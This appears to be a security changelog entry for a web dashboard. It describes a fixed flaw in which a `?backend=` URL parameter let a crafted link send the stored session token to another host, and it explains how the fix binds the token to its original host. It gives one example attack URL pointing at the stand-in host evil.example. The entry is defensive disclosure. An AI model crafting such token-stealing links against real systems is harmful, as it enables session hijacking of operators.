### Fixed: a `?backend=` in the dashboard URL no longer carries the session token to a new host

The dashboard accepted any parseable origin from `?backend=`, persisted it, scrubbed it from
the address bar and attached the stored bearer to the first request, so one link to the
operator's own dashboard with `?backend=https://evil.example` sent the live session token to
the attacker on page load. The token is now bound to the host it was given for and is sent
only there. A URL-supplied backend that would move the token is judged by the same
`connectionChange()` rule the Settings drawer applies to a typed address: the page dials the
new host without the token, keeps `?backend=` visible, persists nothing, and the sign-in
screen asks before the token is carried over. The same gate holds the drawer's other
confirm-required verdict: `?backend=http://<same host>` beside a stored `https://` origin is a
clear-text downgrade and dials bare until the operator says yes. `?backend=X&token=T` drops T
unseen when X moves the page, a `?token=` alone is redeemed against the backend before it is
believed (f019), and a scheme `fetch` cannot speak is refused (finding f003).
